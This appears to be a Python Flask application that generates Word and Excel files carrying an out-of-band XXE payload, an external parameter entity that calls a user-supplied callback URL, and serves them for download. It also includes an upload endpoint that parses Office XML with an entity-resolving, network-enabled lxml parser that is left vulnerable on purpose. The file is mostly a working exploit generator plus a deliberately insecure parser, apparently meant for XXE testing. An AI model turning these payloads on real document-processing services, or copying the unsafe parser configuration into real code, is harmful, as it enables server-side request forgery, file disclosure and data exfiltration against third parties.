from flask import Flask, render_template, request, send_file, jsonify
import os
from docx import Document
from docx.shared import Inches
import openpyxl
from io import BytesIO
import requests
import xml.etree.ElementTree as ET
import logging
import zipfile
from lxml import etree
import re

app = Flask(__name__)
logging.basicConfig(level=logging.DEBUG)

def validate_and_fix_url(url):
    """Validate URL and add http:// if no schema is present"""
    url = url.strip()
    if not url:
        raise ValueError("URL cannot be empty")
        
    # url schema check
    if not re.match(r'^https?://', url):
        url = f'http://{url}'
        
    return url

class FileGenerator:
    @staticmethod
    def create_docx_with_xxe(callback_url):
        doc = Document()
        doc.add_paragraph("XXE Test Document")
        
        # Save to temporary file first
        temp_output = BytesIO()
        doc.save(temp_output)
        temp_output.seek(0)
        
        # Create new DOCX with modified content
        output = BytesIO()
        
        with zipfile.ZipFile(temp_output, 'r') as inzip:
            with zipfile.ZipFile(output, 'w') as outzip:
                # Copy existing files
                for item in inzip.filelist:
                    if not item.filename.endswith('document.xml'):
                        outzip.writestr(item.filename, inzip.read(item.filename))
                
                # add XXE payload to document.xml
                xxe_payload = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE doc [
<!ENTITY % remote SYSTEM "{callback_url}">
%remote;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p>
            <w:r>
                <w:t>XXE Test Document</w:t>
            </w:r>
        </w:p>
    </w:body>
</w:document>'''
                
                outzip.writestr('word/document.xml', xxe_payload)
        
        output.seek(0)
        return output

    @staticmethod
    def create_xlsx_with_xxe(callback_url):
        # Create temporary XLSX file
        wb = openpyxl.Workbook()
        ws = wb.active
        ws['A1'] = 'XXE Test'
        
        # Save to temporary file
        temp_output = BytesIO()
        wb.save(temp_output)
        temp_output.seek(0)
        
        # Create new XLSX with modified content
        output = BytesIO()
        
        with zipfile.ZipFile(temp_output, 'r') as inzip:
            with zipfile.ZipFile(output, 'w') as outzip:
                # Copy all files from original XLSX
                for item in inzip.filelist:
                    if item.filename != 'xl/workbook.xml':
                        outzip.writestr(item.filename, inzip.read(item.filename))
                
                # add XXE payload to workbook.xml
                xxe_payload = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE workbook [
<!ENTITY % remote SYSTEM "{callback_url}">
%remote;
]>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <sheets>
        <sheet name="Sheet" sheetId="1" r:id="rId1"/>
    </sheets>
</workbook>'''
                
                outzip.writestr('xl/workbook.xml', xxe_payload)
        
        output.seek(0)
        return output

class Validator:
    @staticmethod
    def process_file(file):
        """Vulnerable file processor for testing XXE"""
        try:
            # vulnerable parser
            parser = etree.XMLParser(resolve_entities=True, no_network=False)
            
            if file.filename.endswith('.xlsx'):
                with zipfile.ZipFile(file, 'r') as zip_ref:
                    # Process XML files in XLSX
                    for filename in zip_ref.namelist():
                        if filename.endswith('.xml'):
                            xml_content = zip_ref.read(filename)
                            try:
                                etree.fromstring(xml_content, parser=parser)
                            except Exception as e:
                                app.logger.debug(f"XML Parse Error in {filename}: {str(e)}")
                
            elif file.filename.endswith('.docx'):
                with zipfile.ZipFile(file, 'r') as zip_ref:
                    # Process XML files in DOCX
                    for filename in zip_ref.namelist():
                        if filename.endswith('.xml'):
                            xml_content = zip_ref.read(filename)
                            try:
                                etree.fromstring(xml_content, parser=parser)
                            except Exception as e:
                                app.logger.debug(f"XML Parse Error in {filename}: {str(e)}")
            
            return {'success': True, 'message': 'File processed successfully'}
                
        except Exception as e:
            app.logger.error(f"Processing Error: {str(e)}")
            return {'success': False, 'message': f'Processing failed: {str(e)}'}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/create_file', methods=['POST'])
def create_file():
    try:
        callback = request.form.get('callback', '').strip()
        if not callback:
            return jsonify({'error': 'Callback URL is required'}), 400
            
        # validate url
        callback = validate_and_fix_url(callback)
        
        file_type = request.form.get('file_type')
        
        if file_type == 'docx':
            file_obj = FileGenerator.create_docx_with_xxe(callback)
            filename = 'test.docx'
            mimetype = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        else:
            file_obj = FileGenerator.create_xlsx_with_xxe(callback)
            filename = 'test.xlsx'
            mimetype = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
        
        return send_file(
            file_obj,
            as_attachment=True,
            download_name=filename,
            mimetype=mimetype
        )
    except Exception as e:
        app.logger.error(f"File Creation Error: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/vulnerable', methods=['GET', 'POST'])
def vulnerable():
    if request.method == 'POST':
        if 'file' not in request.files:
            return jsonify({'success': False, 'message': 'No file uploaded'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'success': False, 'message': 'No selected file'}), 400
            
        result = Validator.process_file(file)
        return jsonify(result)
    
    return render_template('vulnerable.html')

@app.route('/about')
def about():
    return render_template('about.html')

if __name__ == '__main__':
    app.run(debug=True)
